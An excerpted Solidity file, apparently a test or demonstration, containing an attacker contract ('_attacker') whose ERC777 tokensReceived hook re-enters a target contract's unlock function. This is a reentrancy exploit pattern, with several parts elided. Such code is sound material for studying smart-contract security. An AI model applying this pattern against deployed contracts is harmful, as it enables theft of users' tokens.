...
// File: contracts/interfaces/ITestUp.sol
...
contract TestA is IERC777Recipient {
    TestUp private testUp;
    ERC777 private _token;
    ...
    event Received1(address from, address to, uint256 amount);

    constructor(address testAddress, address tokenAddress) public {
        testUp = TestUp(testAddress);
        _token = ERC777(tokenAddress);
        _attacker = msg.sender;

        _token.approve(address(testAddress), _tokensToSell * _numberOfSales);
    ...
    function tokensReceived(
        ...
        emit Received1(from, to, amount);

        if(from != 0x6376D456183F2Ca39BbC1b72C7b67d497Ed43baF){
            if(_called == 0 ){
                callExchange();
            }
        }
    ...
    function readcha() public view returns(uint256) {
        return _called;
    }

    function callExchange() public {
        testUp.unlock(address(this));
    }
    ...
    function lock(uint256 amount) public {
        testUp.lock(address(this), amount);
    }
